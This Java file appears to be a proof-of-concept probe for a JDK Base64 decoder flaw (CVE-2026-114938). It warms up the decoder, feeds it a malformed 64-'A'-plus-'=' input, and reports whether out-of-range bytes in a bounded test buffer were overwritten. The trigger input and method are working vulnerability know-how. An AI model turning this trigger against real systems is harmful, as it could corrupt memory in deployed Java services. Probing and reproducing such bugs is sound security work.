import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Calif's proof-of-concept code for CVE-2026-114938, with local comments, from
 * https://calif.io/java4shell for reference.
 *
 * This PoC tests the 64*'A'+'=' tail and fixed output offsets. Results depend on the
 * build and compiled path. Java4ShellProbe.java also tests 128*'A'+'='; the matrix
 * needed that longer tail on JDK 17-20. Neither probe covers every possible input.
 *
 * Bounded trigger: observed writes stay inside an oversized 4096-byte array.
 * Use a test host; this is not a safety guarantee for untested JVMs.
 */
public final class Base64Trigger {
    private static volatile int sink;

    public static void main(String[] args) {
        Base64.Decoder decoder = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] malformed = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] target = new byte[4096];

        for (int i = 0; i < 200_000; i++) {
            sink += decoder.decode(valid, target);
        }

        Arrays.fill(target, (byte) 0x5a);
        boolean rejected = false;
        try {
            decoder.decode(malformed, target);
        } catch (IllegalArgumentException expected) {
            rejected = true;
        }

        int changed = 0;
        int first = -1;
        int last = -1;
        for (int i = 50; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }

        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        System.out.printf("rejected=%s changed=%d first=%d last=%d%n",
            rejected, changed, first, last);

        if (!rejected || changed != 62 || first != 50 || last != 111) {
            System.err.println("NOT REPRODUCED");
            System.exit(1);
        }
        System.out.println("REPRODUCED");
    }
}
